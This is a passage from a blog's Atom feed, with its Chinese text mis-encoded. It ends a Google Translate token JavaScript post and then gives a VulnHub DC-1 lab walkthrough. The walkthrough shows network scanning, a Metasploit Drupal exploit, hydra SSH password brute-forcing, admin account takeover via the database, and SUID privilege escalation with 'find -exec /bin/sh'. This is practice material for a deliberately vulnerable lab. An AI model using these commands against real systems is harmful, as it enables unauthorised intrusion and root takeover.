class="line">    a ^= <span class="built_in">Number</span>(d[<span class="number">1</span>]) || <span class="number">0</span>;</span><br><span class="line">    <span class="number">0</span> &gt; a &amp;&amp; (a = (a &amp; <span class="number">2147483647</span>) + <span class="number">2147483648</span>);</span><br><span class="line">    a %= <span class="number">1E6</span>;</span><br><span class="line">    <span class="keyword">return</span> (a.toString() + <span class="string">"."</span> + (a ^ b))</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="è¿è¡Œæ•ˆæœ">è¿è¡Œæ•ˆæœ</h4><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529150718.png" alt=""></p><h3 id="äºŒã€æ€»ç»“å¸¸è§ç®—æ³•çš„åŠ å¯†åŸç†">äºŒã€æ€»ç»“å¸¸è§ç®—æ³•çš„åŠ å¯†åŸç†</h3><ul><li>æ•£åˆ—(hash)å‡½æ•°ç®—æ³•ï¼šMD5ã€SHA</li><li>å¯¹ç§°åŠ å¯†ç®—æ³•ï¼šDESã€3DESã€AES</li><li>éå¯¹ç§°æ€§åŠ å¯†ç®—æ³•ï¼šRSAã€DSAã€ECC</li></ul><h4 id="æ•£åˆ—-hash-å‡½æ•°ç®—æ³•">æ•£åˆ—(hash)å‡½æ•°ç®—æ³•</h4><ul><li>ç®€ä»‹</li></ul><p>Hashä¹Ÿç§°æ•£åˆ—ã€å“ˆå¸Œï¼Œå¯¹åº”çš„è‹±æ–‡éƒ½æ˜¯Hashã€‚åŸºæœ¬åŸç†å°±æ˜¯æŠŠä»»æ„é•¿åº¦çš„è¾“å…¥ï¼Œé€šè¿‡Hashç®—æ³•å˜æˆå›ºå®šé•¿åº¦çš„è¾“å‡ºã€‚è¿™ä¸ªæ˜ å°„çš„è§„åˆ™å°±æ˜¯å¯¹åº”çš„Hashç®—æ³•ï¼Œè€ŒåŸå§‹æ•°æ®æ˜ å°„åçš„äºŒè¿›åˆ¶ä¸²å°±æ˜¯å“ˆå¸Œå€¼ã€‚æ´»åŠ¨å¼€å‘ä¸­ç»å¸¸ä½¿ç”¨çš„MD5å’ŒSHAéƒ½æ˜¯å†å²æ‚ ä¹…çš„Hashç®—æ³•ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo md5(&quot;è¿™æ˜¯ä¸€ä¸ªæµ‹è¯•æ–‡æ¡ˆ&quot;);&#x2F;&#x2F; è¾“å‡ºç»“æœï¼š2124968af757ed51e71e6abeac04f98d</span><br></pre></td></tr></table></figure><ul><li>ç‰¹ç‚¹</li></ul><p>ä¸€ã€ä¸å¯é€†ï¼Œä¸åŸè§†æ•°æ®æ²¡æœ‰å¯¹åº”å…³ç³»<br>äºŒã€è¾“å…¥æ•°æ®çš„å¾®å°å˜åŒ–ä¼šå¾—åˆ°å®Œå…¨ä¸åŒçš„hashå€¼ï¼Œç›¸åŒçš„æ•°æ®ä¼šå¾—åˆ°ç›¸åŒçš„å€¼<br>ä¸‰ã€hashç®—æ³•å†²çªæ¦‚ç‡æ¯”è¾ƒå°ï¼Œä½†æ˜¯æ ¹æ®æŠ½å±‰åŸç†ï¼Œä¸€å®šä¼šå­˜åœ¨ä¸åŒçš„è¾“å…¥è¢«æ˜ å°„æˆç›¸åŒè¾“å‡ºçš„æƒ…å†µ</p><h4 id="å¯¹ç§°åŠ å¯†ç®—æ³•">å¯¹ç§°åŠ å¯†ç®—æ³•</h4><ul><li>ç®€ä»‹</li></ul><p>ç§˜é’¥ï¼šåŠ å¯†è§£å¯†ä½¿ç”¨åŒä¸€ä¸ªå¯†é’¥ã€æ•°æ®çš„æœºå¯†æ€§åŒå‘ä¿è¯ã€åŠ å¯†æ•ˆç‡é«˜ã€é€‚åˆåŠ å¯†äºå¤§æ•°æ®å¤§æ–‡ä»¶ã€åŠ å¯†å¼ºåº¦ä¸é«˜(ç›¸å¯¹äºéå¯¹ç§°åŠ å¯†)</p><h4 id="éå¯¹ç§°æ€§åŠ å¯†ç®—æ³•">éå¯¹ç§°æ€§åŠ å¯†ç®—æ³•</h4><ul><li>ç®€ä»‹</li></ul><p>ç§˜é’¥ï¼šåŠ å¯†è§£å¯†ä½¿ç”¨çš„ä¸åŒç§˜é’¥ã€æœ‰ä¸¤ä¸ªå¯†é’¥ã€éœ€è¦ä½¿ç”¨å¯†é’¥ç”Ÿæˆç®—æ³•ç”Ÿæˆä¸¤ä¸ªç§˜é’¥ã€æ•°æ®çš„æœºå¯†æ€§åªèƒ½å•å‘åŠ å¯†ã€å¦‚æœæƒ³è§£å†³è¿™ä¸ªé—®é¢˜ã€åŒå‘éƒ½éœ€è¦å„è‡ªæœ‰ä¸€å¯¹ç§˜é’¥ã€åŠ å¯†æ•ˆç‡ä½ã€åŠ å¯†å¼ºåº¦é«˜</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;ä¸€ã€é€†å‘è°·æ­Œç¿»è¯‘&quot;&gt;ä¸€ã€é€†å‘è°·æ­Œç¿»è¯‘&lt;/h3&gt;
&lt;h4 id=&quot;åˆ†æè¿‡ç¨‹&quot;&gt;åˆ†æè¿‡ç¨‹&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;é¦–æ¬¡åˆ†æ&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;é¦–å…ˆæ‰¾åˆ°è°·æ­Œç¿»è¯‘çš„Ajaxè¯·æ±‚æ¥å£&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubuse
      
    
    </summary>
    
    
      <category term="JSé€†å‘" scheme="http://yoursite.com/categories/JS%E9%80%86%E5%90%91/"/>
    
    
      <category term="JSé€†å‘ç³»åˆ—" scheme="http://yoursite.com/tags/JS%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>VulnHubæ¸—é€ä¹‹DC-1</title>
    <link href="http://yoursite.com/2020/05/25/VulnHub%E6%B8%97%E9%80%8F%E4%B9%8BDC-1/"/>
    <id>http://yoursite.com/2020/05/25/VulnHub%E6%B8%97%E9%80%8F%E4%B9%8BDC-1/</id>
    <published>2020-05-25T04:57:51.000Z</published>
    <updated>2020-05-25T04:58:49.509Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0Ã—00-è¯´æ˜">0Ã—00 è¯´æ˜</h2><blockquote><p>kaliä¸ç›®æ ‡å¤„äºåŒä¸€ç½‘æ®µä¸‹<br>æ”»å‡»æœºï¼šKali(VMware ) IP:192.168.1.31</p></blockquote><p>ç‰¹åˆ«è¯´æ˜ï¼šæ¯ä¸ªé¶æœºä½œè€…éƒ½å¯¹é¶æœºåšäº†è¯¦ç»†çš„æè¿°ä»¥åŠæ”»å‡»ç›®æ ‡ï¼Œæ¯”å¦‚DC1å°±éœ€è¦æ‰¾åˆ°5ä¸ªflagï¼Œæœ€ç»ˆç›®æ ‡æ˜¯åœ¨rootçš„ä¸»ç›®å½•ä¸­æ‰¾åˆ°å¹¶è¯»å–è¯¥æ ‡å¿—ï¼</p><p>é€šè¿‡æ¯ä¸ªflagæ‰€è·å¾—çŸ¥è¯†ç‚¹</p><p>1ã€msfçš„ç†Ÿç»ƒä½¿ç”¨ä»¥åŠæœç´¢å¯åˆ©ç”¨æ¼æ´ï¼ˆDrupalï¼‰ï¼›</p><p>2ã€ç•™æ„ç›®æ ‡ç½‘ç«™çš„é…ç½®æ–‡ä»¶ï¼ˆæ…¢æ…¢æŸ¥çœ‹åˆ«é”™è¿‡é‡è¦ä¿¡æ¯ï¼‰ï¼›</p><p>3ã€æ•°æ®åº“ç®¡ç†å‘˜ææƒï¼ˆæ›´æ–°ç®¡ç†å‘˜å¯†ç æˆ–è€…æ·»åŠ ä¸€ä¸ªæ–°ç”¨æˆ·ï¼‰ï¼›</p><p>4ã€suidææƒçš„å‘½ä»¤ï¼ˆnmapã€vimã€findã€bashã€moreã€lessã€nanoã€cpï¼‰ã€‚</p><h2 id="0Ã—01-ä¿¡æ¯æ”¶é›†">0Ã—01 ä¿¡æ¯æ”¶é›†</h2><h3 id="æ¢æµ‹ç›®æ ‡IP">æ¢æµ‹ç›®æ ‡IP</h3><p>namp -sP 192.168.1.0/24<br>arp-scan -l//æ‰«æå½“å‰ç½‘æ®µä¸‹çš„IP<br>Cadmus Computer Systems è¡¨ç¤ºVirtualboxè™šæ‹Ÿæœº<br>åˆ†æå¾—å‡ºç›®æ ‡IPä¸º192.168.1.30</p><blockquote><p>é¶æœºï¼šDC-1(Virtualbox) IP:192.168.1.30</p></blockquote><h3 id="æ‰«æç«¯å£">æ‰«æç«¯å£</h3><p>nmap -sV -p- 192.168.1.30//æ‰«æå…¨ç«¯å£<br>-sV ç”¨æ¥æ‰«æç›®æ ‡ä¸»æœºå’Œç«¯å£ä¸Šè¿è¡Œçš„è½¯ä»¶çš„ç‰ˆæœ¬<br>-p- æ‰«æ0-65535å…¨éƒ¨ç«¯å£</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524190438.png" alt=""></p><p>80ç«¯å£å¼€æ”¾ï¼Œè®¿é—®ä¸€ä¸‹</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524191012.png" alt=""></p><p>Wappalyzerè¿›è¡Œç½‘ç«™æŒ‡çº¹è¯†åˆ«ï¼ŒæŸ¥çœ‹åˆ°æ˜¯Drupal 7</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524191337.png" alt=""></p><p>æŸ¥çœ‹ä¸€ä¸‹robots.txtæ–‡ä»¶å·²ç»ç›®å½•æ‰«æ(çœç•¥)ã€‚ã€‚å‘ç°æ²¡æœ‰å¯åˆ©ç”¨çš„åœ°æ–¹</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524192628.png" alt=""></p><h2 id="0Ã—02metasploit">0Ã—02metasploit</h2><p>ç›´æ¥ä¸Šmetasploit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@sf:~# msfconsole</span><br><span class="line">msf &gt; search Drupal</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524201135.png" alt=""></p><p>é€‰æ‹©4ï¼Œdrupalgeddon2çš„expï¼Œè®¾ç½®ä¸‹rhostï¼Œç›´æ¥exploitï¼ŒæˆåŠŸ</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524212454.png" alt=""></p><p>æ¥ä¸‹æ¥ä½¿ç”¨msfè‡ªå¸¦çš„shell</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524213300.png" alt=""></p><h3 id="å‘ç°flag1">å‘ç°flag1</h3><p>æŸ¥çœ‹å½“å‰è·¯å¾„ä¸‹çš„æ–‡ä»¶ï¼Œå‘ç°<code>flag1.txt</code>æ–‡ä»¶ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ï¼Œå‘ç°æç¤ºCMSé…ç½®æ–‡ä»¶æœ‰çŒ«è…»</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524213406.png" alt=""></p><h3 id="å‘ç°flag2">å‘ç°flag2</h3><p>ç½‘ä¸Šæœç´¢å¾—çŸ¥ï¼ŒDrupal 7çš„é»˜è®¤é…ç½®æ–‡ä»¶ä¸º<code>sites/default/settings.php</code>ï¼ŒæŸ¥çœ‹å‘ç°flag2ï¼Œè¿˜æœ‰æ•°æ®åº“è¿æ¥ä¿¡æ¯</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524213927.png" alt=""></p><h2 id="0Ã—003-å¼¯è·¯">0Ã—003 å¼¯è·¯</h2><p>å°è¯•è¿æ¥æ•°æ®åº“ï¼Œç»“æœè¿æ¥å¤±è´¥ï¼Œåº”è¯¥æ˜¯æƒé™ä¸è¶³</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524214247.png" alt=""></p><h3 id="çˆ†ç ´flag4ç”¨æˆ·å¯†ç ">çˆ†ç ´flag4ç”¨æˆ·å¯†ç </h3><p>äºæ˜¯å»æŸ¥çœ‹<code>/etc/passwd</code>æ–‡ä»¶ï¼Œå‘ç°flag4ç”¨æˆ·</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524214358.png" alt=""></p><p>ä½¿ç”¨hydraå°è¯•çˆ†ç ´flag4ç”¨æˆ·çš„å¯†ç ï¼Œ<code>hydra -l flag4 -P /usr/share/john/password.lst ssh://192.168.1.30</code></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524214646.png" alt=""></p><p>æˆåŠŸçˆ†ç ´flag4çš„å¯†ç ï¼Œä¸º orange ï¼Œæ¥ä¸‹æ¥sshç™»å½•flag4ç”¨æˆ·ï¼ŒæŸ¥çœ‹å½“å‰è·¯å¾„ä¸‹æœ‰<code>flag4.txt</code>ï¼Œå¾—åˆ°æ–°çš„æç¤ºâ€”â€”rootç›®å½•é‡Œæœ‰ä¸ªflag</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215013.png" alt=""></p><h2 id="0Ã—04-è¿æ¥æ•°æ®åº“">0Ã—04 è¿æ¥æ•°æ®åº“</h2><p>ç„¶åæˆ‘ä»¬è¿æ¥æ•°æ®åº“ï¼Œè¿™æ¬¡æˆåŠŸ</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215205.png" alt=""></p><p>é¡ºè—¤æ‘¸ç“œï¼Œä»”ç»†æŸ¥æ‰¾æ•°æ®åº“</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215355.png" alt=""></p><p>æŸ¥çœ‹userè¡¨ï¼Œå‘ç°adminç”¨æˆ·</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215445.png" alt=""></p><p>æŸ¥çœ‹roleè¡¨</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215512.png" alt=""></p><p>æŸ¥çœ‹role_permissionè¡¨</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215644.png" alt=""></p><p>æŸ¥çœ‹nodeè¡¨</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215712.png" alt=""></p><h3 id="å‘ç°flag3">å‘ç°flag3</h3><p>å‘ç°flag3ï¼Œå¾—çŸ¥uidä¸º1çš„ç”¨æˆ·æ˜¯ä¸å—Drupalæƒé™ç®¡åˆ¶çš„ï¼Œå…·æœ‰æœ€é«˜æƒé™ï¼Œuid 1ç”¨æˆ·ä¹Ÿå°±æ˜¯adminï¼Œ</p><h2 id="0Ã—05-ä¸¤ä¸ªæ€è·¯">0Ã—05 ä¸¤ä¸ªæ€è·¯</h2><h3 id="ä¸€ã€é‡ç½®ç®¡ç†å‘˜å¯†ç ">ä¸€ã€é‡ç½®ç®¡ç†å‘˜å¯†ç </h3><p>ä½¿ç”¨Drupalå¯¹æ•°æ®åº“çš„åŠ å¯†æ–¹æ³•ï¼ŒåŠ å¯†è„šæœ¬ä½ç½®åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹çš„scriptä¸‹(msf shell)ï¼Œä½¿ç”¨è„šæœ¬ç”ŸæˆåŠ å¯†å¯†æ–‡ï¼Œç„¶åç™»é™†æ•°æ®åº“ä¿®æ”¹adminçš„å¯†ç </p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524222511.png" alt=""></p><p>ä¿®æ”¹å¯†ç ä¸º123456</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524222543.png" alt=""></p><p>æˆåŠŸç™»é™†</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524222616.png" alt=""></p><h3 id="äºŒã€æ·»åŠ ä¸€ä¸ªç®¡ç†å‘˜æƒé™çš„ç”¨æˆ·">äºŒã€æ·»åŠ ä¸€ä¸ªç®¡ç†å‘˜æƒé™çš„ç”¨æˆ·</h3><p>å…ˆæŸ¥çœ‹ä¸€ä¸‹é¶æœºçš„ç‰ˆæœ¬ï¼Œ7.24</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524232222.png" alt=""></p><p>msfæœç´¢Druapl 7.24å¯¹åº”å¯åˆ©ç”¨çš„è„šæœ¬ï¼Œå‘ç°ä¸€ä¸ªç¬¦åˆ</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524232538.png" alt=""></p><p>è¿è¡Œè„šæœ¬ï¼Œè¿›è¡Œåˆ©ç”¨</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524232830.png" alt=""></p><p>å¢åŠ äº†ä¸€ä¸ªç”¨æˆ·userï¼Œå¯†ç ä¸º123456ï¼Œå°è¯•ç™»é™†ç½‘ç«™ï¼Œå‘ç°ç™»é™†æˆåŠŸ</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524233018.png" alt=""></p><h3 id="å‘ç°flag3-2">å‘ç°flag3</h3><p>ä»ç½‘ç«™ä¸Šæ‰¾åˆ°äº†flag3çš„ç•Œé¢ï¼Œå¾—åˆ°æç¤º<code>Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.</code>ï¼Œé‡ç‚¹åœ¨ï¼ˆFIND the passwdã€need to -exec that commandã€in the shadowï¼‰</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524223823.png" alt=""></p><p>æ ¹æ®çº¿ç´¢ï¼Œæˆ‘ä»¬åˆæ‰¾åˆ°äº†flag4ä»¥åŠå®ƒçš„ç›®å½•ï¼Œå†æ ¹æ®flag4çš„æç¤ºï¼Œï¼ˆç”¨ç›¸åŒçš„æ–¹æ³•åœ¨rootç›®å½•ä¸‹ï¼‰æ‰¾åˆ°æœ€ç»ˆflag</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524224339.png" alt=""></p><h2 id="0Ã—06-ææƒ">0Ã—06 ææƒ</h2><p>äºæ˜¯ï¼Œæƒ³åˆ°suidææƒï¼ŒæŸ¥è¯¢å…·æœ‰rootæƒé™çš„å‘½ä»¤ï¼Œä»¥ä¸‹å‡å¯æŸ¥è¯¢ï¼š</p><ul><li>find / -user root -perm -4000 -print 2&gt;/dev/null</li><li>find / -perm -u=s -type f 2&gt;/dev/null</li><li>find / -user root -perm -4000 -exec ls -ldb { }<br>æ³¨ï¼š -type få³æ–‡ä»¶ï¼Œ-perm -u=s å³useræƒé™ä½ä¸ºsuid</li></ul><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524230257.png" alt=""></p><p>å‘ç°<code>find</code>å‘½ä»¤æœ¬èº«å°±æ˜¯rootæƒé™</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524230453.png" alt=""></p><p>äºæ˜¯å°±ç”¨<code>find</code>ææƒï¼Œ<code>find ./ aaa -exec '/bin/sh' \\;</code> ï¼Œæˆ–è€…æ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼ŒéªŒè¯ä¸€ä¸‹ï¼Œå·²ç»æ˜¯rootäº†</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524230955.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524231608.png" alt=""></p><h3 id="æœ€ç»ˆflag">æœ€ç»ˆflag</h3><p>æ¥ç€æ‰¾åˆ°æ ¹ç›®å½•ä¸‹çš„rootç›®å½•ï¼Œé‡Œé¢å°±æ˜¯æœ€ç»ˆçš„flag</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524231307.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524231720.png" alt=""></p><h2 id="0Ã—07-æ€»ç»“">0Ã—07 æ€»ç»“</h2><p>DC-1æ‰¾åˆ°æœ€ç»ˆçš„flagå¹¶ä¸éš¾ï¼Œéš¾åœ¨æ‰¾é½äº”ä¸ªflagï¼Œç¬¬ä¸€æ¬¡å®éªŒï¼Œå¾ˆç”Ÿç–ï¼Œå­˜åœ¨å¾ˆå¤šé—®é¢˜ï¼š</p><ul><li><p>metasploit ç†Ÿç»ƒåº¦ä¸è¶³ï¼Œä¸”exploitæ¨¡å—æˆåŠŸåçš„shellä¸æ˜¯äº¤äº’æ€§ï¼ŒDC-1å®‰è£…äº†pythonç¯å¢ƒï¼Œå¯ä»¥é€šè¿‡pty.spawn()è·å¾—äº¤äº’æ€§shell</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524235827.png" alt=""></p></li><li><p>exploitdbç†Ÿç»ƒåº¦ä¹Ÿä¸è¶³</p></li><li><p>Linuxç†Ÿç»ƒåº¦ä¸è¶³ï¼Œfindå‘½ä»¤ï¼Œæœ‰å¾…å­¦ä¹ </p></li><li><p>suidææƒçš„å‘½ä»¤ï¼ˆnmapã€vimã€findã€bashã€moreã€lessã€nanoã€cpï¼‰ï¼Œæœ‰å¾…å­¦ä¹ </p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0Ã—00-è¯´æ˜&quot;&gt;0Ã—00 è¯´æ˜&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;kaliä¸ç›®æ ‡å¤„äºåŒä¸€ç½‘æ®µä¸‹&lt;br&gt;
æ”»å‡»æœºï¼šKali(VMware ) IP:192.168.1.31&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ç‰¹åˆ«è¯´æ˜ï¼šæ¯ä¸ªé¶æœºä½œè€…éƒ½å¯¹é¶æœºåšäº†è¯¦ç»†çš„
      
    
    </summary>
    
    
      <category term="æ¸—é€" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="VulnHub" scheme="http://yoursite.com/tags/VulnHub/"/>
    
  </entry>
  
</feed>
